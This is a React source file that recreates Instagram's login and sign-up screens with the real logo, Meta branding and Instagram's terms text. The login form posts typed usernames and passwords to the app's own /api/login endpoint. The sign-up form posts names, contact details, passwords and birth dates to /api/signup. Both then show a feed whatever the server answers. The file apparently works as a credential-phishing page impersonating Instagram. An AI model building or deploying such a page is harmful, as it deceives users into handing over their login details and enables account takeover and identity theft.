import React, { useState } from 'react';
import { Facebook, Info, ChevronLeft } from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';
import Feed from './Feed';
import './index.css';

type View = 'login' | 'signup' | 'feed';

export default function App() {
  const [view, setView] = useState<View>('login');
  const [formData, setFormData] = useState({
    loginId: '',
    password: '',
    emailOrMobile: '',
    fullName: '',
    username: '',
    signupPassword: '',
    dobDay: '1',
    dobMonth: 'Month',
    dobYear: 'Year'
  });

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target;
    setFormData(prev => ({ ...prev, [name]: value }));
  };

  const handleLoginSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    try {
      const response = await fetch('/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          username: formData.loginId,
          password: formData.password
        })
      });
      await response.json();
      setView('feed');
    } catch (error) {
      console.error('Login error:', error);
      setView('feed');
    }
  };

  const handleSignupSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    try {
      const response = await fetch('/api/signup', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          emailOrMobile: formData.emailOrMobile,
          fullName: formData.fullName,
          username: formData.username,
          password: formData.signupPassword,
          dob: `${formData.dobDay} ${formData.dobMonth} ${formData.dobYear}`
        })
      });
      await response.json();
      setView('feed');
    } catch (error) {
      console.error('Signup error:', error);
      setView('feed');
    }
  };

  const days = Array.from({ length: 31 }, (_, i) => i + 1);
  const months = [
    'January', 'February', 'March', 'April', 'May', 'June',
    'July', 'August', 'September', 'October', 'November', 'December'
  ];
  const years = Array.from({ length: 100 }, (_, i) => 2026 - i);

  if (view === 'feed') {
    return (
        <AnimatePresence>
            <motion.div
                key="feed"
                initial={{ opacity: 0, scale: 0.98 }}
                animate={{ opacity: 1, scale: 1 }}
                exit={{ opacity: 0, scale: 0.98 }}
                className="feed-container"
            >
                <Feed />
            </motion.div>
        </AnimatePresence>
    );
  }

  return (
    <div className="app-container">
      <main className="main-content">
        <AnimatePresence mode="wait">
          {view === 'login' ? (
            <motion.div
              key="login"
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -20 }}
              className="login-view"
            >
              <div className="login-visuals">
                <div className="logo-container">
                  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/800px-Instagram_logo.svg.png" alt="Instagram" className="instagram-logo-img" />
                </div>
                <h1 className="hero-text">
                  See everyday moments from <br />
                  your <span className="gradient-text">close friends.</span>
                </h1>
                
                <div className="mockup-stack">
                  <div className="mockup center-mockup">
                    <img src="https://picsum.photos/seed/insta1/250/380" alt="Mockup" className="mockup-img" referrerPolicy="no-referrer" />
                    <div className="mockup-overlay">
                       <div className="mockup-avatar"></div>
                       <div className="mockup-bar"></div>
                    </div>
                  </div>
                  <div className="mockup left-mockup">
                    <img src="https://picsum.photos/seed/insta2/220/330" alt="Mockup" className="mockup-img opaque-img" referrerPolicy="no-referrer" />
                  </div>
                  <div className="mockup right-mockup">
                    <img src="https://picsum.photos/seed/insta3/220/330" alt="Mockup" className="mockup-img opaque-img" referrerPolicy="no-referrer" />
                  </div>
                </div>
              </div>

              <div className="auth-form-container">
                <div className="auth-box">
                  <h2 className="auth-title">Log in to Instagram</h2>
                  <form onSubmit={handleLoginSubmit} className="auth-form">
                    <div className="input-group">
                      <input
                        type="text"
                        name="loginId"
                        id="loginId"
                        placeholder="Mobile number, username or email address"
                        className="auth-input peer"
                        value={formData.loginId}
                        onChange={handleInputChange}
                        required
                      />
                      <label htmlFor="loginId" className="auth-label">
                        Mobile number, username or email address
                      </label>
                    </div>
                    <div className="input-group">
                      <input
                        type="password"
                        name="password"
                        id="password"
                        placeholder="Password"
                        className="auth-input peer"
                        value={formData.password}
                        onChange={handleInputChange}
                        required
                      />
                      <label htmlFor="password" className="auth-label">
                        Password
                      </label>
                    </div>
                    <button type="submit" className="primary-btn">Log in</button>
                  </form>

                  <a href="#" className="forgot-password">Forgotten password?</a>

                  <div className="divider">
                    <div className="line"></div>
                  </div>

                  <button className="fb-login-btn">
                    <Facebook size={18} fill="#0064E0" color="#0064E0" />
                    Log in with Facebook
                  </button>

                  <button onClick={() => setView('signup')} className="secondary-btn">
                    Create new account
                  </button>
                </div>

                <div className="meta-footer">
                  <span className="meta-text">
                    <svg viewBox="0 0 448 512" width="16" height="16" className="meta-icon">
                      <path d="M400 32H48C21.5 32 0 53.5 0 80v352c0 26.5 21.5 48 48 48h352c26.5 0 48-21.5 48-48V80c0-26.5-21.5-48-48-48zM224 416c-106 0-192-86-192-192S118 32 224 32s192 86 192 192-86 192-192 192zm104.7-192c0-57.8-46.9-104.7-104.7-104.7S119.3 166.2 119.3 224s46.9 104.7 104.7 104.7 104.7-46.9 104.7-104.7z" />
                    </svg>
                    Meta
                  </span>
                </div>
              </div>
            </motion.div>
          ) : (
            <motion.div
              key="signup"
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              exit={{ opacity: 0, scale: 0.95 }}
              className="signup-view"
            >
              <div className="back-header">
                <button onClick={() => setView('login')} className="back-btn">
                  <ChevronLeft size={24} />
                </button>
                <span className="meta-text">
                  <svg viewBox="0 0 448 512" width="16" height="16" className="meta-icon">
                    <path d="M400 32H48C21.5 32 0 53.5 0 80v352c0 26.5 21.5 48 48 48h352c26.5 0 48-21.5 48-48V80c0-26.5-21.5-48-48-48zM224 416c-106 0-192-86-192-192S118 32 224 32s192 86 192 192-86 192-192 192zm104.7-192c0-57.8-46.9-104.7-104.7-104.7S119.3 166.2 119.3 224s46.9 104.7 104.7 104.7 104.7-46.9 104.7-104.7z" />
                  </svg>
                  Meta
                </span>
              </div>

              <div className="auth-box signup-box">
                <h2 className="signup-title">Get started on Instagram</h2>
                <p className="signup-subtitle">Sign up to see photos and videos from your friends.</p>

                <form onSubmit={handleSignupSubmit} className="auth-form">
                  <div className="form-group">
                    <label className="form-label">Mobile number or email address</label>
                    <input
                      type="text"
                      name="emailOrMobile"
                      placeholder="Mobile number or email address"
                      className="form-input"
                      value={formData.emailOrMobile}
                      onChange={handleInputChange}
                      required
                    />
                    <p className="form-hint">You may receive notifications from us. <a href="#">Learn why we ask for your contact information</a></p>
                  </div>

                  <div className="form-group">
                    <label className="form-label">Password</label>
                    <input
                      type="password"
                      name="signupPassword"
                      placeholder="Password"
                      className="form-input"
                      value={formData.signupPassword}
                      onChange={handleInputChange}
                      required
                    />
                  </div>

                  <div className="form-group">
                    <div className="label-with-icon">
                      <span className="form-label">Date of birth</span>
                      <Info size={16} className="info-icon" />
                    </div>
                    <div className="dob-container">
                      <select name="dobDay" className="dob-select" value={formData.dobDay} onChange={handleInputChange}>
                        <option disabled>Day</option>
                        {days.map(d => <option key={d} value={d}>{d}</option>)}
                      </select>
                      <select name="dobMonth" className="dob-select" value={formData.dobMonth} onChange={handleInputChange}>
                         <option disabled>Month</option>
                        {months.map(m => <option key={m} value={m}>{m}</option>)}
                      </select>
                      <select name="dobYear" className="dob-select" value={formData.dobYear} onChange={handleInputChange}>
                        <option disabled>Year</option>
                        {years.map(y => <option key={y} value={y}>{y}</option>)}
                      </select>
                    </div>
                  </div>

                  <div className="form-group">
                    <label className="form-label">Name</label>
                    <input
                      type="text"
                      name="fullName"
                      placeholder="Full name"
                      className="form-input"
                      value={formData.fullName}
                      onChange={handleInputChange}
                      required
                    />
                  </div>

                  <div className="form-group">
                    <label className="form-label">Username</label>
                    <input
                      type="text"
                      name="username"
                      placeholder="Username"
                      className="form-input"
                      value={formData.username}
                      onChange={handleInputChange}
                      required
                    />
                  </div>

                  <div className="terms-text">
                    People who use our service may have uploaded your contact information to Instagram. <a href="#">Learn more</a>.<br /><br />
                    By tapping Submit, you agree to create an account and to Instagram's <a href="#">Terms</a>, <a href="#">Privacy Policy</a> and <a href="#">Cookies Policy</a>.<br /><br />
                    The <a href="#">Privacy Policy</a> describes the ways we can use the information we collect when you create an account. For example, we use this information to provide, personalise and improve our products, including ads.
                  </div>

                  <button type="submit" className="primary-btn signup-btn">Submit</button>
                  <button type="button" onClick={() => setView('login')} className="secondary-btn signup-secondary-btn">I already have an account</button>
                </form>
              </div>
            </motion.div>
          )}
        </AnimatePresence>
      </main>

      <footer className="footer">
        <div className="footer-links">
          {['Meta', 'About', 'Blog', 'Jobs', 'Help', 'API', 'Privacy', 'Terms', 'Locations', 'Instagram Lite', 'Threads', 'Contact uploading and non-users', 'Meta Verified'].map(link => (
            <a key={link} href="#">{link}</a>
          ))}
        </div>
        <div className="footer-bottom">
          <span className="lang-selector">
            English (UK)
            <ChevronLeft size={14} className="dropdown-icon" />
          </span>
          <span>© 2026 Instagram from Meta</span>
        </div>
      </footer>
    </div>
  );
}
